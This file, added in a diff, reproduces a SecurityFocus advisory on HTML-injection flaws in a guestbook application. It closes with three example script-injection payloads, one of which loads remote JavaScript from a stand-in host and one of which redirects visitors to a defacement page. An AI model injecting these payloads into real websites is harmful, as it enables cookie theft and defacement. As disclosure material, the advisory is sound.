@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/17438/info
+
+Guestbook is prone to multiple HTML-injection vulnerabilities; the application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+An example has been provided:
+
+<script>alert(/Liz0ziM/)</script>
+
+<script src=http://www.example.com/hacked.js></script>
+
+<script>location.href="http://www.example.com/deface.html";</script>
